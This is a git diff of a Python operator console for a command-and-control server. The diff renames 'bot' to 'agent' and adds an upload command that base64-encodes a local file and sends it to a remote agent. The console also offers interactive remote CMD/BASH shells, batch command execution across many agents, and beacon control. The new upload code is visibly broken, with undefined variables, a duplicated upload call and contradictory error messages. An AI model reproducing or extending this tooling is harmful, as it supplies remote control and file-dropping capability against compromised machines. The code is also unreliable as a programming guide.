@@ -6,6 +6,7 @@ import signal
 import threading
 import queue
 import time
+import base64
 
 class Interpreter(threading.Thread):
     def __init__(self, agentList, listeners, loggers):
@@ -30,7 +31,7 @@ class Interpreter(threading.Thread):
             # TODO:
             # commands:
             #   - list-mods
-            #   - info <bot-id>
+            #   - info <agent-id>
 
             # Change this to case/switch statements; probs look cleaner
 
@@ -52,19 +53,56 @@ class Interpreter(threading.Thread):
                 self.batchMode()
             elif (cmd.strip(" ") == "help"):
                 self.printUsage()
+            elif (cmd.startswith("upload")):
+                try:
+                    local_filename = str(cmd.split()[1])
+                    remote_filename = str(cmd.split()[2])
+                    bot_id = str(cmd.split()[3])
+                except Exception as ex:
+                    print(f"[* Interpreter-Msg:Upload] Unable to process filename or agent-id entered...")
+                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Unable to process filename/agent-id for upload procedure')            
+                    print(f"[* Interpreter-Msg:Upload] Error: {ex}")
+                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Error: '+str(ex))            
+                else:
+                    for agent in self.agentList:
+                        if agent.getID() == bot_id:
+
+                            self.upload(local_filename, remote_filename, agent)
+                            try:
+                                with open(local_filename,mode='rb') as file:
+                                    filedata = file.read()
+                                b64filedata = base64.b64encode(filedata).decode('utf-8')
+                                b64datalen = len(b64filedata)
+                                
+                                # This will send following data to agent:
+                                # upload <filename> <b64_size>
+                                agent.execute('upload {} {}'.format(remotefile,b64datalen))
+                                time.sleep(0.7)
+                                agent.execute(b64filedata)
+                                time.sleep(0.7)
+                                # To not input prompt before response
+                                while len(list(self.rq.queue)) >= 1:
+                                    time.sleep(0.1)
+                            except FileNotFoundError:
+                                print(f"[* Interpreter-Msg:Upload] File {arg_filename} exists")
+                                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+arg_filename+'" exists')                                
+                            except Exception as ex:
+                                print("[-] Unhandled Exception while reading or sending file: {}".format(ex))
+
+                    else:
+                        print(f"[* Interpreter-Msg:Upload] File {arg_filename} does not exist")
+                        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+arg_filename+'" does not exist')
+
             elif (cmd.startswith("kill")):
                 try:
-                    # print(cmd)
                     arg_id = int(cmd.split()[1])
-                    # print(arg_id)
                 except Exception as ex:
-                    print(f"[* Interpreter-Msg] Unable to process Agent ID entered...")
-                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to process Agent ID for kill')            
-                    print(f"[* Interpreter-Msg] Error: {ex}")
-                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))            
-
+                    print(f"[* Interpreter-Msg:Kill] Unable to process Agent ID entered...")
+                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to process Agent ID for kill')            
+                    print(f"[* Interpreter-Msg:Kill] Error: {ex}")
+                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Error: '+str(ex))            
                 else:
-                    # Check if exists
+                    # Check if agent exists
                     agentFound = False
                     for agent in self.agentList:
                         if agent.getID == arg_id:
@@ -75,15 +113,15 @@ class Interpreter(threading.Thread):
                         try:
                             self.kill(arg_id)
                         except Exception as ex: 
-                            print(f"[* Interpreter-Msg] Unable to kill connection with bot {arg_id}...")
-                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to kill connection for Bot '+arg_id)            
-                            print(f"[* Interpreter-Msg] Error: {ex}")
-                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))            
+                            print(f"[* Interpreter-Msg:Kill] Unable to kill connection with agent {arg_id}...")
+                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to kill connection for agent '+arg_id)            
+                            print(f"[* Interpreter-Msg:Kill] Error: {ex}")
+                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Error: '+str(ex))            
                     else:
-                        print(f"[* Interpreter-Msg] Unable to kill connection with bot {arg_id}...")                        
-                        print(f"[* Interpreter-Msg] Agent {arg_id} does not exist...\n")
-                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to kill connection with Agent '+str(arg_id))
-                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Agent '+str(arg_id)+' does not exist') 
+                        print(f"[* Interpreter-Msg:Kill] Unable to kill connection with agent {arg_id}...")                        
+                        print(f"[* Interpreter-Msg:Kill] Agent {arg_id} does not exist...\n")
+                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to kill connection with Agent '+str(arg_id))
+                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Agent '+str(arg_id)+' does not exist') 
 
             elif (cmd.startswith("interact")):
                 try:
@@ -91,8 +129,8 @@ class Interpreter(threading.Thread):
                     arg_id = int(cmd.split()[1])
                     # print(arg_id)
                 except Exception as ex:
-                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
-                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to process Bot ID entry')            
+                    print(f"[* Interpreter-Msg] Unable to process agent ID entered...")
+                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to process agent ID entry')            
                     print(f"[* Interpreter-Msg] Error: {ex}")
                     self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))            
 
@@ -108,12 +146,12 @@ class Interpreter(threading.Thread):
                         try:
                             self.interact(arg_id)
                         except Exception as ex: 
-                            print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")
-                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to initiate interaction with Bot '+str(arg_id))            
+                            print(f"[* Interpreter-Msg] Unable to initiate interaction with agent {arg_id}...")
+                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to initiate interaction with agent '+str(arg_id))            
                             print(f"[* Interpreter-Msg] Error: {ex}")
                             self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))
                     else:
-                        print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")                        
+                        print(f"[* Interpreter-Msg] Unable to initiate interaction with agent {arg_id}...")                        
                         print(f"[* Interpreter-Msg] Agent {arg_id} does not exist...\n")
                         self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to initiate interaction with Agent '+str(arg_id))
                         self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Agent '+str(arg_id)+' does not exist')            
@@ -133,8 +171,8 @@ class Interpreter(threading.Thread):
         - clear                         : Clears the screen; Presents a fresh terminal
         - list-agents                   : Lists all active agents in use
         AGENTS:
-        - interact <id>                 : Opens an interactive BASH/CMD prompt on the selected bot
-        - kill <id>                     : Kill a connection to a specific bot. Causes bot process to exit. [* Will not recur *]
+        - interact <id>                 : Opens an interactive BASH/CMD prompt on the selected agent
+        - kill <id>                     : Kill a connection to a specific agent. Causes agent process to exit. [* Will not recur *]
         MODULES:
         - list-modules <windows|linux>  : List all modules currently available to the user on the C2, seperated by operating system
         - load-module <module-name>     : Loads a module into the chamber       
@@ -147,7 +185,7 @@ class Interpreter(threading.Thread):
         batchList = []
 
         os.system("clear")
-        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering batch-mode, prompting for bot-list')
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering batch-mode, prompting for agent-list')
 
         print('''
 [* Interpreter-Msg] Entering Batch-Mode execution...\n
@@ -164,7 +202,7 @@ class Interpreter(threading.Thread):
                 break
             else:    
                 try:
-                    bm_entry = input('[* Interpreter-Msg] Enter list of Bot-IDs to interact with (seperated by spaces): ')
+                    bm_entry = input('[* Interpreter-Msg] Enter list of agent-IDs to interact with (seperated by spaces): ')
                     idlist = [int(n) for n in bm_entry.split()]
                     print(f"[* Interpreter-Msg] ID list obtained: {str(idlist)}")
                     self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Batch-mode ID list obtained: '+str(idlist))            
@@ -174,14 +212,13 @@ class Interpreter(threading.Thread):
                     self.loggers[0].q_log('serv','error',('[* Interpreter-Msg] Unable to form list of IDs to add to BatchMode-list: ' + str(bm_entry)))
                     print(f"[* Interpreter-Msg] Error: {ex}")
                     self.loggers[0].q_log('serv','error',('[* Interpreter-Msg] Error: ' + str(ex)))
-
                     bm_success = False
                 else:
                     for conn in self.agentList:
                         if conn.getID() in idlist:
                             batchList.append(conn)
 
-                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Stopping beacons for bots '+str(idlist)+' while in batch-mode')            
+                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Stopping beacons for agents '+str(idlist)+' while in batch-mode')            
                             conn.stopBeacon()
                     bm_success = True
 
@@ -191,7 +228,7 @@ class Interpreter(threading.Thread):
             os.system("clear")
             print(f'''
 [* Interpreter-Msg] Batch-Mode execution confirmed: 
-[* Interpreter-Msg] The commands entered here will be sent to these Bots: {idlist}
+[* Interpreter-Msg] The commands entered here will be sent to these agents: {idlist}
 [* Interpreter-Msg] Note that this mode will not allow for individual shell environment interaction\n
 [* Interpreter-Msg] Enter Q or QUIT at any time to exit this mode
 [* Interpreter-Msg] Enter EXIT at any time to exit the C2\n\n
@@ -224,10 +261,10 @@ class Interpreter(threading.Thread):
       
                 else:
                     try:
-                        print(f"[+] Sending Command: {batch_cmd} to {str(len(batchList))} bots")
+                        print(f"[+] Sending Command: {batch_cmd} to {str(len(batchList))} agents")
                         for conn in batchList:                                     
                             time.sleep(0.1)
-                            print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
+                            print(f"[* BATCH-CMD] Agent #{conn.getID()} response: ")
                             print(conn.execute(batch_cmd))
                     except Exception as ex:
                         print("[* Interpreter-Msg] Error with sending command or receiving output")
@@ -242,15 +279,15 @@ class Interpreter(threading.Thread):
 
 #------------------------------------------------------------------------------------------------------------------------------
     def exit(self):
-        print(f"[* Interpreter-Msg] Closing connection to {str(len(self.agentList))} bots")
-        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Closing connection to all bots')
+        print(f"[* Interpreter-Msg] Closing connection to {str(len(self.agentList))} agents")
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Closing connection to all agents')
 
         for agent in self.agentList:                                         
             time.sleep(0.1)
             agent.execute("exit")
         self.loggers[0].q_log('serv','info','[* Interpreter-Msg] "exit" command sent to all active agents')
 
-        print("[* Interpreter-Msg] Exiting connections for all bots. Please wait...")
+        print("[* Interpreter-Msg] Exiting connections for all agents. Please wait...")
         time.sleep(5)
         self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Exiting C2')       
         os._exit(0)
@@ -268,11 +305,10 @@ class Interpreter(threading.Thread):
 #------------------------------------------------------------------------------------------------------------------------------
     def interact(self, id):
         # print("Shell function entry point")
-        print(f"[* Interpreter-Msg] Entering individual interaction with Bot #{id}.\n")
+        print(f"[* Interpreter-Msg] Entering individual interaction with agent #{id}.\n")
         print("[* Interpreter-Msg] Be mindful that this mode is quite loud.")
         print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")
-        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering individual interaction mode for Bot '+str(id))
-
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering individual interaction mode for agent '+str(id))
 
         shellExecStatus = False
         self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Calling handler .shell() function')
@@ -283,15 +319,15 @@ class Interpreter(threading.Thread):
 
         if shellExecStatus:
             print("[* Interpreter-Msg] Shell exited gracefully...\n")
-            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Individual shell interaction mode for Bot '+str(id)+' exited successfully')
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Individual shell interaction mode for agent '+str(id)+' exited successfully')
 
         else:
             print("[* Interpreter-Msg] Shell exited with errors...\n")
-            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Individual shell interaction mode for Bot '+str(id)+' exited unsuccessfully')
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Individual shell interaction mode for agent '+str(id)+' exited unsuccessfully')
 #------------------------------------------------------------------------------------------------------------------------------
     def kill(self, id):
-        print(f"[* Interpreter-Msg] Killing connection with Bot #{id}.\n")
-        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Killing connection with bot '+str(id))
+        print(f"[* Interpreter-Msg] Killing connection with agent #{id}.\n")
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Killing connection with agent '+str(id))
 
         self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Calling handler .kill() function')
         for agent in self.agentList:
@@ -299,17 +335,17 @@ class Interpreter(threading.Thread):
                 killStatus = agent.kill()
 
         if killStatus:
-            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Removing bot '+str(id)+' from agent list')
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Removing agent '+str(id)+' from agent list')
             for agent in self.agentList:
                 if agent.getID() == id:
                     self.agentList.remove(agent)
                     break
-            print(f"[* Interpreter-Msg] Bot #{id} was killed peacefully...\n")
-            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Bot '+str(id)+' was killed successfully')
+            print(f"[* Interpreter-Msg] Agent #{id} was killed peacefully...\n")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] agent '+str(id)+' was killed successfully')
 
         else:
-            print(f"[* Interpreter-Msg] Bot #{id} was killed with errors...\n")
-            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Bot '+str(id)+' was killed unsuccessfully')
+            print(f"[* Interpreter-Msg] Agent #{id} was killed with errors...\n")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] agent '+str(id)+' was killed unsuccessfully')
 #------------------------------------------------------------------------------------------------------------------------------
     def log_history(self, cmd):
         with open("log/.history", "a") as history:
@@ -320,3 +356,36 @@ class Interpreter(threading.Thread):
             print(f.read())
         self.loggers[0].q_log('serv','info','[* Interpreter-Msg] History printed')
 #------------------------------------------------------------------------------------------------------------------------------
+    def listModules(self):
+        print("TODO")
+#------------------------------------------------------------------------------------------------------------------------------
+    def upload(self, lf, rf, agt):
+
+        print(f"[* Interpreter-Msg:Upload] Attempting to upload {lf} to remote file {rf} on agent {agent.getID()}")
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Attempting to upload '+str(arg_filename)+' to remote file '+str(rf)+' on agent '+str(agt.getID()))
+
+        try:
+            with open(lf,mode='rb') as file:
+                filedata = file.read()
+        except FileNotFoundError:
+            print(f"[* Interpreter-Msg:Upload] File {arg_filename} does not exist")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+arg_filename+'" does not exist')
+        except Exception as ex:
+            print(f"[* Interpreter-Msg:Upload] Unable to read file '{lf}' ")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+arg_filename+'" exists') 
+
+        b64filedata = base64.b64encode(filedata).decode('utf-8')
+        b64datalen = len(b64filedata)
+            
+        # This will send following data to agent:
+        # upload <filename> <b64_size>
+
+        try:
+            agent.execute('upload {} {}'.format(rf,b64datalen))
+        except Exception as ex:
+            print(f"[* Interpreter-Msg:Upload] Unable to ")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+arg_filename+'" exists') 
+        else:
+            time.sleep(0.7)
+            agent.execute(b64filedata)
+            time.sleep(1.5)
